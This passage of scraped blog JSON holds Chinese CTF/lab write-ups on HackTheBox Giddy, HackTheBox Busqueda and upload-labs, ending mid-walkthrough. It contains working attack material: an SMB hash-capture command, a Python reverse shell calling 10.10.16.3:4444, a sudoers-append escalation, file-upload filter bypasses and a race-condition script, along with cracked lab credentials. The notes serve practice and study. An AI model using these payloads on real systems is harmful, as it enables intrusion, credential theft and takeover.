Attack。这种攻击的基本步骤如下：攻击者在自己的机器上设置一个监听器，等待NTLM认证请求。攻击者通过SQL注入或其他手段，使目标服务器执行xp_dirtree，并使用UNC路径指向攻击者的机器。当目标服务器尝试访问该UNC路径时，它会发送一个NTLM认证请求到攻击者的机器。攻击者的机器接收到这个请求，并获取到NET-NTLM hash。 使用 impacket-smbserver，通过xp_dirtree函数连接到该服务获取到相应的哈希 mkdir smb # 创建 smb 目录cd smb # 进入 smb目录impacket-smbserver share `pwd` # 在当前目录启动 SMB server，共享名称为 share，反引号 pwd 来获取当前目录的路径，并将该路径作为共享目录。在命令执行后，其他计算机可以通过SMB协议访问共享名称为 share 的目录;exec xp_dirtree \\\\10.10.14.15\\share;-- Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.129.96.140,49714)[*] AUTHENTICATE_MESSAGE (GIDDY\\Stacy,GIDDY)[*] User GIDDY\\Stacy authenticated successfully[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:334223febb33d8eeef0ee93deddbd9a9:0101000000000000007f1f005206da0140031a75096245b600000000010010006200710047004d00530076004f004700030010006200710047004d00530076004f004700020010006f00470076004f004b0063007a005400040010006f00470076004f004b0063007a00540007000800007f1f005206da0106000400020000000800300030000000000000000000000000300000fe20d99ed518821e757fa75f815931c59c97175ac0244f99b0e3d6f0708293f20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000[*] AUTHENTICATE_MESSAGE (GIDDY\\Stacy,GIDDY)[*] User GIDDY\\Stacy authenticated successfully[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:3ccb4ab60836158fa44c35c421fb2dea:010100000000000000ac50015206da014aaa6878a74ae00c00000000010010006200710047004d00530076004f004700030010006200710047004d00530076004f004700020010006f00470076004f004b0063007a005400040010006f00470076004f004b0063007a0054000700080000ac50015206da0106000400020000000800300030000000000000000000000000300000fe20d99ed518821e757fa75f815931c59c97175ac0244f99b0e3d6f0708293f20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000[*] Disconnecting Share(1:SHARE)[*] Closing down connection (10.129.96.140,49714)[*] Remaining connections [] 使用john破解hash john --wordlist=/usr/share/wordlists/rockyou.txt hash 用户名：GIDDY\\Stacy 密码：xNnWo6272k7x 在Desktop目录找到第一个flag:5499a3fdc3d0a109edec1897db85ad44 权限提升当前用户权限过低，大部分命令无法执行 谷歌一下unifivideo，发现是一个视频监控服务，UniFi Video是Ubiquiti Networks开发的一个视频监控软件，旨在提供易于使用的视频监控解决方案。它可以通过Ubiquiti的UniFi NVR硬件或在用户自己的服务器上运行。 UniFi Video支持多种视频监控设备和摄像头，并提供了许多功能，如实时监控、录像回放、活动检测、警报通知等。此外，它还提供了一个基于Web的用户界面，可让用户轻松管理和配置其视频监控系统。 searchsploit unifi video #searchsploit是一个用于搜索和利用已知漏洞的命令行工具，而unifi video是指Ubiquiti Networks的一个视频监控软件。通过在命令行中运行searchsploit unifi video，您可以搜索与Unifi Video相关的已知漏洞。searchsploit -m 43390.txt #这个命令使用searchsploit工具并结合-m选项，用于将特定漏洞的详细信息显示在终端上。43390.txt是一个漏洞编号或漏洞描述文件的示例。cat 43390.txt #cat命令用于查看文件的内容，而43390.txt是一个文件名的示例。 Ubiquiti UniFi Video中存在本地提权漏洞。本地攻击者可利用该漏洞以提升的权限执行任意代码。漏洞编号为CVE-2016-6914，在UniFi Video运行时会在目录 C:\\ProgramData\\unifi-video 下运行一个 taskkill.exe ，并提权，利用方式即为在目录下上传一个名为 taskkill.exe 的木马，再重启UniFi Video。 cs生成一个exe木马，利用impacket-smbserver上传到靶机，再关闭开启Ubiquiti UniFi Video服务 copy \\\\10.10.14.15\\Share\\taskkill.exe taskkill.exe Stop-Service Ubiquiti UniFi Videostart-service unifivideoservice 找到第二个flag:4d9456312a4bbb1fab9a3e9f48956532","tags":["HackTheBox"],"categories":["笔记","靶场日记","HackTheBox"]},{"title":"Busqueda_easy","path":"/2023/10/10/Busqueda_easy/","content":"Busqueda_easy 信息收集namp：--min-rate 10000 10000速率来扫描-p- 全端口-p80,135 指定80，135端口扫描-sU 指定udp扫描-sT 指定tcp协议-sV 扫描服务版本-sC 默认脚本扫描-O 对操作系统和版本探测--script=vuln 进行基础漏洞扫描 可知靶机开启22端口和80端口 尝试访问80端口 发现跳转至http://searcher.htb/ 修改hosts文件 font style=color:rgb(51, 51, 51);vim /etc/hosts/font 漏洞探测22端口为ssh服务 顺手爆破一下，万一弱口令呢 测试功能点，看到框就想SQL注入一下 注入无果，猜测 ‘ 为某种闭合导致语句无法正常执行，再次尝试 ‘+’正常回显，证明猜测 此时语句应为 query’11’+’’ 这里有个版权信息指向https://github.com/ArjunSharda/Searchor Searchor 2.4.0版本。在github中查看历史版本发现2.4.2中修复了一个漏洞 跟进查看一下 2.4.2版本去除了eval的使用 修复了远程命令执行漏洞 下载2.4.0版本源码 发现在srcsearchormain.py调用了eval 它可以提供使用以下函数执行任意代码的能力： __import__(os).system(CMD)__import__(os).popen(CMD).read() payload就应为‘+import(“os”).system(“ls”)+’ 漏洞利用反弹shell 11+__import__(os).system(python3 -c \\import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\10.10.16.3\\,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\/bin/bash\\)\\)+ 权限提升查看家目录 在家目录下发现user.txt 为第一个flag 175509029a5543355630a64433c10791 翻翻文件看看，找到git账号密码 cody:jh1usoih2bkjaspwe92 尝试访问 http://gitea.searcher.htb/ 无法访问 修改hosts后成功 使用cody账号登录gitea系统，尝试administrator使用同密码登录失败 对比了一下这个仓库和varwwwapp中文件，可能cody即为svc 尝试使用此密码登录ssh，svc:jh1usoih2bkjaspwe92 sudo -l 命令用于列出当前用户在 sudoers 文件中被授权执行的命令以及使用哪些参数和选项。如果当前用户没有 root 权限，这个命令可以让用户查看自己可以执行哪些以 root 权限执行的命令，从而帮助用户理解他们的权限。如果用户有足够的特权，它也可以用于更改 sudoers 文件或添加新的授权。 跟进一下system-checkup.py文件，发现只有执行权限 运行一下system-checkup.py sudo /usr/bin/python3 /opt/scripts/system-checkup.py -hdocker-ps:列出正在运行的docker容器 docker-inspect:检查某个docker容器 full-checkup:执行全系统检查 都执行一次查看 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-pssudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspectsudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup docker-ps 列出一个gitea容器和一个mysql容器 docker-inspect 提示要跟两个参数 full-checkup 对容器体检 掏出GPT font style=color:rgb(16, 18, 20);sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format=json .Config f84a6b33fb5a/font 在配置文件中找到两个密码 jI86kGUuj87guWr3RyF yuiu1hoiu4i5ho1uh 碰碰运气试试密码，只有gitea使用 administrator:yuiu1hoiu4i5ho1uh 登录成功 回到system-checkup.py文件 #!/bin/bashimport subprocessimport sysactions = [full-checkup, docker-ps,docker-inspect]def run_command(arg_list): r = subprocess.run(arg_list, capture_output=True) if r.stderr: output = r.stderr.decode() else: output = r.stdout.decode() return outputdef process_action(action): if action == docker-inspect: try: _format = sys.argv[2] if len(_format) == 0: print(fFormat cant be empty) exit(1) container = sys.argv[3] arg_list = [docker, inspect, --format, _format, container] print(run_command(arg_list)) except IndexError: print(fUsage: sys.argv[0] docker-inspect format container_name) exit(1) except Exception as e: print(Something went wrong) exit(1) elif action == docker-ps: try: arg_list = [docker, ps] print(run_command(arg_list)) except: print(Something went wrong) exit(1) elif action == full-checkup: try: arg_list = [./full-checkup.sh] print(run_command(arg_list)) print([+] Done!) except: print(Something went wrong) exit(1) if __name__ == __main__: try: action = sys.argv[1] if action in actions: process_action(action) else: raise IndexError except IndexError: print(fUsage: sys.argv[0] action (arg1) (arg2)) print() print( docker-ps : List running docker containers) print( docker-inspect : Inpect a certain docker container) print( full-checkup : Run a full system checkup) print() exit(1) 在full-checkup处 elif action == full-checkup: try: arg_list = [./full-checkup.sh] print(run_command(arg_list)) print([+] Done!) except: print(Something went wrong) exit(1) 这部分代码定义了’full-checkup’操作的处理逻辑。它尝试执行名为’full-checkup.sh’的脚本，并将输出打印到终端。如果执行过程中发生错误，它会打印出”Something went wrong”的错误消息，并退出脚本执行。如果一切顺利，它会打印”[+] Done!”作为完成的提示消息。 但是此处 full-checkup.sh 没有使用绝对路径路径，意味着可以在其他目录创建此文件并执行。 切换tmp目录 不出意外执行错误，证明猜想 touch full-checkup.sh #创建 full-checkup.sh 文件echo #!/bin/bash full-checkup.sh #追加内容echo echo svc ALL=(ALL:ALL) ALL /etc/sudoers full-checkup.sh #追加内容chmod 777 full-checkup.sh #赋予权限sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\t#执行 提权为root，查看家目录获取第二个flag 1c4bb1d71ccdf756979b6d7c4aafb3e9","tags":["HackTheBox"],"categories":["笔记","靶场日记","HackTheBox"]},{"title":"upload-labs靶场通关","path":"/2023/08/09/upload-labs靶场通关/","content":"pass-01 源码 function checkFile() var file = document.getElementsByName(upload_file)[0].value; if (file == null || file == ) alert(请选择要上传的文件!); return false; //定义允许上传的文件类型 var allow_ext = .jpg|.png|.gif; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(.)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + |) == -1) var errMsg = 该文件不允许上传，请上传 + allow_ext + 类型的文件,当前文件类型为： + ext_name; alert(errMsg); return false; 上传白名单,仅允许上传.jpg|.png|.gif,但是只有前端校验上传jpg抓包修改为php 连接webshell复制图片地址,使用蚁剑连接 pass-02源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) if (($_FILES[upload_file][type] == image/jpeg) || ($_FILES[upload_file][type] == image/png) || ($_FILES[upload_file][type] == image/gif)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH . / . $_FILES[upload_file][name] if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 文件类型不正确，请重新上传！; else $msg = UPLOAD_PATH.文件夹不存在,请手工创建！; 会对MIME进行验证,与pass-01一样,上传png抓包修改为php pass-03 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.asp,.aspx,.php,.jsp); $file_name = trim($_FILES[upload_file][name]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.date(YmdHis).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 不允许上传.asp,.aspx,.php,.jsp后缀文件！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传黑名单,可以上传php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)来绕过 pass-04 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.php,.php5,.php4,.php3,.php2,.php1,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.pHp1,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.ini); $file_name = trim($_FILES[upload_file][name]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件不允许上传!; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传黑名单,几乎所有可以上传的文件类型都被写死,但是可以上传.htaccess FilesMatch shell.jpgSetHandler application/x-httpd-php/FilesMatch 这个文件里面的含义就是将shell.jpg文件解析为php然后直接上传图片马,就可以解析为php pass-05 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess); $file_name = trim($_FILES[upload_file][name]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件类型不允许上传！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传禁止了常见后缀名,也包括.htaccess,反复观察发现没有被限制的后缀名有 .php7 以及 .iniphp.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。但是想要引发 .user.ini 解析漏洞需要三个前提条件 服务器脚本语言为PHP 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 提示 上传.user.ini auto_ prepend_ file=shell.jpg意思是所有文件都包含shell.jpg 再上传图片马,蚁剑连接readme.php文件,图片马就被包含进去以php代码执行 第二种方法绕过抓包修改后缀为shell.php. . 点空格点蚁剑连接shell.php即可 pass-06 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini); $file_name = trim($_FILES[upload_file][name]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, .); $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.date(YmdHis).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件类型不允许上传！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传 黑名单,但是可以使用大小写绕过 pass-07 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini); $file_name = $_FILES[upload_file][name]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.date(YmdHis).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件不允许上传; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传黑名单,但是没有去掉空格,使用空格绕过 pass-08 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini); $file_name = trim($_FILES[upload_file][name]); $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件类型不允许上传！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传黑名单,去空格并且转换为小写,但是忽略了.,文件名尾加.绕过 pass-09 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini); $file_name = trim($_FILES[upload_file][name]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.date(YmdHis).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件类型不允许上传！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传在上关的基础上去掉了. 使用特殊字符绕过::$DATAphp在window的时候如果文件名+”::$ DATA”会把:: $DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。 pass-10 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini); $file_name = trim($_FILES[upload_file][name]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, .); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(::$DATA, , $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 此文件类型不允许上传！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传在上一关的基础上,禁止::$DATA,但是deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来使用pass-05的第二种方法,. .绕过 pass-11 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) if (file_exists(UPLOAD_PATH)) $deny_ext = array(php,php5,php4,php3,php2,html,htm,phtml,pht,jsp,jspa,jspx,jsw,jsv,jspf,jtml,asp,aspx,asa,asax,ascx,ashx,asmx,cer,swf,htaccess,ini); $file_name = trim($_FILES[upload_file][name]); $file_name = str_ireplace($deny_ext,, $file_name); $temp_file = $_FILES[upload_file][tmp_name]; $img_path = UPLOAD_PATH./.$file_name; if (move_uploaded_file($temp_file, $img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = UPLOAD_PATH . 文件夹不存在,请手工创建！; 上传删除黑名单中的关键字但是只检测一次,使用双写绕过 上传之后得到文件名shell.php pass-12 源码 $is_upload = false;$msg = null;if(isset($_POST[submit])) $ext_arr = array(jpg,png,gif); $file_ext = substr($_FILES[upload_file][name],strrpos($_FILES[upload_file][name],.)+1); if(in_array($file_ext,$ext_arr)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = $_GET[save_path]./.rand(10, 99).date(YmdHis)...$file_ext; if(move_uploaded_file($temp_file,$img_path)) $is_upload = true; else $msg = 上传出错！; else $msg = 只允许上传.jpg|.png|.gif类型文件！; 上传白名单,最后的路径是靠拼接,可以使用%00截断原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。 pass-13 源码 $is_upload = false;$msg = null;if(isset($_POST[submit])) $ext_arr = array(jpg,png,gif); $file_ext = substr($_FILES[upload_file][name],strrpos($_FILES[upload_file][name],.)+1); if(in_array($file_ext,$ext_arr)) $temp_file = $_FILES[upload_file][tmp_name]; $img_path = $_POST[save_path]./.rand(10, 99).date(YmdHis)...$file_ext; if(move_uploaded_file($temp_file,$img_path)) $is_upload = true; else $msg = 上传失败; else $msg = 只允许上传.jpg|.png|.gif类型文件！; 上传与上关一样,区别是post提交,post不会对里面的数据自动解码，需要在Hex中修改。 pass-14 源码 function getReailFileType($filename) $file = fopen($filename, rb); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(C2chars, $bin); $typeCode = intval($strInfo[chars1].$strInfo[chars2]); $fileType = ; switch($typeCode) case 255216: $fileType = jpg; break; case 13780: $fileType = png; break; case 7173: $fileType = gif; break; default: $fileType = unknown; return $fileType;$is_upload = false;$msg = null;if(isset($_POST[submit])) $temp_file = $_FILES[upload_file][tmp_name]; $file_type = getReailFileType($temp_file); if($file_type == unknown) $msg = 文件未知，上传失败！; else $img_path = UPLOAD_PATH./.rand(10, 99).date(YmdHis)...$file_type; if(move_uploaded_file($temp_file,$img_path)) $is_upload = true; else $msg = 上传出错！; 上传会判断强两个字节的来确定上传文件的后缀是否为白名单里的,需要上传图片马配合文件包含漏洞上传图片马点击文件包含漏铜 pass-15 源码 function isImage($filename) $types = .jpeg|.png|.gif; if(file_exists($filename)) $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)=0) return $ext; else return false; else return false; $is_upload = false;$msg = null;if(isset($_POST[submit])) $temp_file = $_FILES[upload_file][tmp_name]; $res = isImage($temp_file); if(!$res) $msg = 文件未知，上传失败！; else $img_path = UPLOAD_PATH./.rand(10, 99).date(YmdHis).$res; if(move_uploaded_file($temp_file,$img_path)) $is_upload = true; else $msg = 上传出错！; 上传在上关的基础上,校验图片的大小,依旧可以和上关一样使用图片马绕过 pass-16 源码 function isImage($filename) //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) case IMAGETYPE_GIF: return gif; break; case IMAGETYPE_JPEG: return jpg; break; case IMAGETYPE_PNG: return png; break; default: return false; break; $is_upload = false;$msg = null;if(isset($_POST[submit])) $temp_file = $_FILES[upload_file][tmp_name]; $res = isImage($temp_file); if(!$res) $msg = 文件未知，上传失败！; else $img_path = UPLOAD_PATH./.rand(10, 99).date(YmdHis)...$res; if(move_uploaded_file($temp_file,$img_path)) $is_upload = true; else $msg = 上传出错！; 上传在上关的基础上再检查后缀,依旧使用图片马绕过 pass-17 源码 $is_upload = false;$msg = null;if (isset($_POST[submit])) // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[upload_file][name]; $filetype = $_FILES[upload_file][type]; $tmpname = $_FILES[upload_file][tmp_name]; $target_path=UPLOAD_PATH./.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,.),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == jpg) ($filetype==image/jpeg)) if(move_uploaded_file($tmpname,$target_path)) //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false) $msg = 该文件不是jpg格式的图片！; @unlink($target_path); else //给新图片指定文件名 srand(time()); $newfilename = strval(rand())..jpg; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH./.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; else $msg = 上传出错！; else if(($fileext == png) ($filetype==image/png)) if(move_uploaded_file($tmpname,$target_path)) //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false) $msg = 该文件不是png格式的图片！; @unlink($target_path); else //给新图片指定文件名 srand(time()); $newfilename = strval(rand())..png; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH./.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; else $msg = 上传出错！; else if(($fileext == gif) ($filetype==image/gif)) if(move_uploaded_file($tmpname,$target_path)) //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false) $msg = 该文件不是gif格式的图片！; @unlink($target_path); else //给新图片指定文件名 srand(time()); $newfilename = strval(rand())..gif; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH./.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; else $msg = 上传出错！; else $msg = 只允许上传后缀为.jpg|.png|.gif的图片文件！; 上传同上,图片马传就完事了 pass-18 源码 $is_upload = false;$msg = null;if(isset($_POST[submit])) $ext_arr = array(jpg,png,gif); $file_name = $_FILES[upload_file][name]; $temp_file = $_FILES[upload_file][tmp_name]; $file_ext = substr($file_name,strrpos($file_name,.)+1); $upload_file = UPLOAD_PATH . / . $file_name; if(move_uploaded_file($temp_file, $upload_file)) if(in_array($file_ext,$ext_arr)) $img_path = UPLOAD_PATH . /. rand(10, 99).date(YmdHis)...$file_ext; rename($upload_file, $img_path); $is_upload = true; else $msg = 只允许上传.jpg|.png|.gif类型文件！; unlink($upload_file); else $msg = 上传出错！; 上传代码审计,对上传的文件的后缀进行对比,如果不在白名单之内就删除,没有文件包含漏洞,此处利用条件竞争文件上传,再被校验中间是有一个过程的,如果我们在上传后立即访问,占用文件,文件在被使用状态是不可被删除的利用burp重复发包,不设置payload利用脚本去重复访问上传的webshell路径 import requestswhile True: resp = requests.get(url=http://10.20.146.195/upload/shell.php) if resp.status_code == 200: print(攻击成功) break else: continue pass-19 源码 //index.php$is_upload = false;$msg = null;if (isset($_POST[submit])) require_once(./myupload.php); $imgFileName =time(); $u = new MyUpload($_FILES[upload_file][name], $_FILES[upload_file][tmp_name], $_FILES[upload_file][size],$imgFileName); $status_code = $u-upload(UPLOAD_PATH); switch ($status_code) case 1: $is_upload = true; $img_path = $u-cls_upload_dir . $u-cls_file_rename_to; break; case 2: $msg = 文件已经被上传，但没有重命名。; break; case -1: $msg = 这个文件不能上传到服务器的临时文件存储目录。; break; case -2: $msg = 上传失败，上传目录不可写。; break; case -3: $msg = 上传失败，无法上传该类型文件。; break; case -4: $msg = 上传失败，上传的文件过大。; break; case -5: $msg = 上传失败，服务器已经存在相同名称文件。; break; case -6: $msg = 文件无法上传，文件不能复制到目标目录。; break; default: $msg = 未知错误！; break; //myupload.phpclass MyUpload.................. var $cls_arr_ext_accepted = array( .doc, .xls, .txt, .pdf, .gif, .jpg, .zip, .rar, .7z,.ppt, .html, .xml, .tiff, .jpeg, .png );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ) $ret = $this-isUploadedFile(); if( $ret != 1 ) return $this-resultUpload( $ret ); $ret = $this-setDir( $dir ); if( $ret != 1 ) return $this-resultUpload( $ret ); $ret = $this-checkExtension(); if( $ret != 1 ) return $this-resultUpload( $ret ); $ret = $this-checkSize(); if( $ret != 1 ) return 